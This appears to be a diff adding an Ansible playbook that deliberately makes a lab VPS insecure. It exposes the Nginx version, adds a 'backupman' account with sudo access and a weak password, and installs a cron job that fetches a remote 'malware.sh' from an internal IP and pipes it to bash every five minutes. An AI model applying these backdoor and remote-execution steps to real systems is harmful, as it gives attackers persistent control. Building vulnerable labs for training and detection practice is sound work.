@@ -1,0 +1,30 @@
+# D:\ansible-control-node\playbooks\02_introduce_vulnerabilities.yml
+---
+- name: 02 - Introduce Vulnerabilities and Insecure Configurations
+  hosts: vps_lab
+  gather_facts: false
+  
+  tasks:
+    - name: Vuln 1: Expose Nginx version (Information Disclosure)
+      ansible.builtin.lineinfile:
+        path: /etc/nginx/nginx.conf
+        regexp: '^\s*#?server_tokens off;'
+        line: 'server_tokens on;'
+        state: present
+        backrefs: yes # Use backrefs to replace the commented line
+
+    - name: Vuln 2: Create a Vague Account ('backupman') with weak privileges
+      ansible.builtin.user:
+        name: backupman
+        password: "$6$rounds=65536$somesalt$WEAK_PASS_HASH_HERE" # Use 'ansible-vault' in a real scenario
+        shell: /bin/bash
+        groups: sudo # Grant unnecessary sudo access
+        state: present
+        
+    - name: Vuln 3: Add a Vague Cron Job (Potential Persistence/RAT)
+      ansible.builtin.cron:
+        name: "check_updates_bad"
+        job: 'curl -s http://192.168.1.5/malware.sh | bash' # Example of a suspicious external execution
+        minute: "*/5"
+        user: backupman
+        state: present
